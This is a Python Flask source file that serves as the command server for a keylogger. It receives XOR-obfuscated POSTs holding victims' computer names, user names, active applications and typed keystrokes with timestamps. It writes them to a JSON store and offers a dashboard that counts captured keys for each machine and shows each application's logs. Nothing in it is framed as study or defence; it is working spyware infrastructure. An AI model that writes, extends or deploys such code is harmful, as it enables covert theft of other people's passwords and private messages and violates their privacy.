import json
from flask import Flask, render_template, jsonify, request

app = Flask(__name__, template_folder='templates', static_folder='static')

with open('server/static/json/data.json', 'r+') as file:
    json_data = json.load(file)

def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
    key: bytes = key.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

@app.route('/')
def index():
    computers = {}
    
    for computer_name, users in json_data.items():
        app_count = 0
        key_count = 0
        
        for user, apps in users.items():
            app_count += len(apps)
            key_count += sum(len(app.values()) for app in apps.values())
            # for app, timestamps in apps.items():
            #     key_count += sum(len(keys) for keys in timestamps.values())
        
        computers[computer_name] = {"app_count": app_count, "key_count": key_count}
    
    return render_template('index.html', computers=computers)

@app.route('/computer/<computer_name>')
def computer_logs(computer_name):
    if computer_name not in json_data:
        return jsonify({"error": "Computer not found"}), 404
    
    computer_data = json_data[computer_name]
    details = {}
    
    for user, apps in computer_data.items():
        for app, timestamps in apps.items():
            details[app] = {"total_keys": sum(len(keys) for keys in timestamps.values()), "logs": timestamps}
    
    return jsonify(details)

@app.route('/logs', methods=['POST'])
def logs():
    if request.method == 'POST':
        data: str = decrypt_data(request.data).decode()
        data_dict: dict = json.loads(data)
        print(data_dict)

        computer_name = data_dict['computer_name']
        user_name = data_dict['user_name']
        active_app = data_dict['active_app']
        keys = data_dict['keys']
        timestamp = data_dict['timestamp']
        
        json_data.setdefault(computer_name, {}) \
                 .setdefault(user_name, {}) \
                 .setdefault(active_app, {})[timestamp] = keys

        with open('server/static/json/data.json', 'w') as file:
            json.dump(json_data, file, indent=4)

        return data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5556, debug=True)
